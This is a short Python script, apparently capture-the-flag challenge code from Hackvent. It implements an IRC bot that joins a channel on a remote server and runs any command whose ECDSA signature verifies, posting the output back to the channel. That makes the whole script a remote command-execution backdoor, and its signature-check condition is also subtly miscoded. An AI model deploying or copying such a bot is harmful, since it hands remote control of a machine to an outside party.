
import socket
import sys
import random
import string
import time
import base64
import ecdsa
from ecdsa import VerifyingKey
from easyprocess import EasyProcess

public_key = '''-----BEGIN PUBLIC KEY-----
MFYwEAYHKoZIzj0CAQYFK4EEAAoDQgAE+ZrajbQlsKFHp3/4+LRgccajmfwD/xcB
wUF0v1/wQN/+6TEhbzy4OhO+AGKLX6vfemzle9zKt5fzLJHtPsaxJQ==
-----END PUBLIC KEY-----'''

verify_key = VerifyingKey.from_pem(public_key)

def rand_name(): return ''.join([random.choice(string.ascii_letters) for i in range(10)])

nickname = rand_name()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('challenges.hackvent.hacking-lab.com', 6667))

def send(txt):
    try: s.send(txt + '\r\n')
    except: pass

send('USER ' + nickname + ' ' + nickname + ' ' + nickname + ' :' + nickname)
send('NICK ' + nickname)
time.sleep(0.5)
send('JOIN #muffin_bot')
time.sleep(0.5)

def post_channel(msg):
    try: send('PRIVMSG #muffin_bot :' + msg)
    except: pass

while True:
    text = ''
    try: text = s.recv(2040)
    except: pass
    if '[PLAIN]' and '[/PLAIN]' and '[SIGN]' and '[/SIGN]' in text:
        try:
            plain = text[text.index('[PLAIN]')+len('[PLAIN]'):]
            plain = plain[:plain.index('[/PLAIN]')]

            sign = text[text.index('[SIGN]')+len('[SIGN]'):]
            sign = sign[:sign.index('[/SIGN]')]
            sign = base64.b64decode(sign)

            if verify_key.verify(sign, plain):
                answer = EasyProcess(plain).call(timeout=5).stdout
                post_channel(answer)
        except: pass
